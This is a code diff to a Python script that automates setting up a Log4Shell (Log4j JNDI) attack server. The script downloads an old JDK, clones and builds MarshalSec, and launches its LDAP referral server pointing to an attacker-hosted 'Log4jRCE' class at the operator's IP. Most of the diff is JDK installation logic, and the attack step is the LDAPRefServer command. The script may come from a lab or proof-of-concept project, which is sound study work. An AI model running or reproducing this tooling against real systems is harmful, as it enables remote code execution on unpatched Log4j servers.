@@ -39,30 +39,24 @@ except:
 #4. Download JDK-8u181
 # Check if the correct JDK is installed
 print("\nChecking JDK Version\n")
-try:
-    jdk_check = subprocess.run(["javac", "-version"], capture_output=True)
+if path.isfile("/opt/jdk/jdk1.8.0_181/bin/java"):
     # Check if JDK is installed. The output shows up in the stderr instead of the stdout for some reason.
-    print("\n**JDK already installed! Continuing!\n**")
-except:
+    print("\n**JDK 1.8.0_181 already installed! Continuing!\n**")
+else:
     # Download the correct version of the JDK.
     print("\n**Downloading JDK**\n")
     subprocess.run(["wget", "https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz"])
     # Different repository usually a bit slow.
     #subprocess.run(["wget", "http://mirrors.rootpei.com/jdk/jdk-8u181-linux-x64.tar.gz"])
 
-#5. Install JDK
+    #5. Install JDK
     #   Check if directory /opt/jdk exists. 
     if path.exists("/opt/jdk"):
         print("/opt/jdk already exists. Will now continue to extract.")
     else:
         subprocess.run(["sudo", "mkdir", "/opt/jdk"])
-        subprocess.run(["sudo", "tar", "-zxf", "jdk-8u181-linux-x64.tar.gz", "-C", "/opt/jdk"])
-        subprocess.run(["sudo", "update-alternatives", "--install", "/usr/bin/java", "java", "/opt/jdk/jdk1.8.0_181/bin/java", "100"])
-        subprocess.run(["sudo", "update-alternatives", "--install", "/usr/bin/javac", "javac", "/opt/jdk/jdk1.8.0_181/bin/javac", "100"])
-        subprocess.run(["sudo", "update-alternatives", "--display", "java"])
-        subprocess.run(["sudo", "update-alternatives", "--display", "javac"])
-        subprocess.run(["sudo", "update-alternatives", "--set", "java", "/opt/jdk/jdk1.8.0_181/bin/java"])
-        subprocess.run(["java", "-version"])
+    subprocess.run(["sudo", "tar", "-zxf", "jdk-8u181-linux-x64.tar.gz", "-C", "/opt/jdk"])
+        
 
 #6. Get MarshalSec repo
 subprocess.run(["git", "clone", "https://github.com/mbechler/marshalsec.git"])
@@ -75,7 +69,7 @@ subprocess.run(["mvn", "clean", "package", "-DskipTests"])
 
 #8. Run LDAP server. In terminal you need to add "" around the ip address. In subprocess.run this is not required.
 try:
-    subprocess.run(["java", "-cp", "target/marshalsec-0.0.3-SNAPSHOT-all.jar", "marshalsec.jndi.LDAPRefServer", f"http://{ip_addr}:8888/#Log4jRCE"])
+    subprocess.run(["/opt/jdk/jdk1.8.0_181/bin/java", "-cp", "target/marshalsec-0.0.3-SNAPSHOT-all.jar", "marshalsec.jndi.LDAPRefServer", f"http://{ip_addr}:8888/#Log4jRCE"])
 except:
     print("Something went wrong. Please check that you have the correct ip address")
     
